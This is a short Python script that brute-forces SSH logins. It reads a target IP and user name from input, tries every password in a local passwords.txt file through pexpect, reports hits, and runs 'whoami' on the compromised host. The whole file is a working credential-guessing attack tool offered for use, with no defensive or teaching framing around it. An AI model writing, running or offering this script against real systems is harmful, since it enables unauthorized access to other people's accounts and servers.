#!/usr/bin/python3

import pexpect
from termcolor import colored

PROMPT = ['# ', '>>> ', '> ', '\$ ']

def send_command(child,command):
    child.sendline(command)
    child.expect(PROMPT)
    print(child.before)

def connect(user,host,password):
    ssh_newkey = 'Are you sure you want to continue connecting'
    connStr = 'ssh ' + user + '@' + host
    child = pexpect.spawn(connStr)
    ret = child.expect([pexpect.TIMEOUT, ssh_newkey, '[P|p]assword: '])
    if ret == 0:
        print('[-] Error connecting')
        return
    if ret == 1:
        child.sendline('yes')
        ret = child.expect([pexpect.TIMEOUT, '[P|p]assword: '])
        if ret == 0:
            print('[-] Error connecting')
            return
    child.sendline(password)
    child.expect(PROMPT,timeout=0.5)
    return child


def main():
    host = input("Enter IP address to target to bruteforce: ")
    user = input("Enter user Account you want to bruteforce: ")
    file = open('passwords.txt','r')
    for password in file.readlines():
        password = password.strip('\n')
        try:
            child = connect(user, host, password)
            print (colored('[+] Password found: '+ password, 'green'))
            send_command(child,'whoami')
        except:
            print (colored('[-] Wrong password: '+password, 'red'))
    
main()
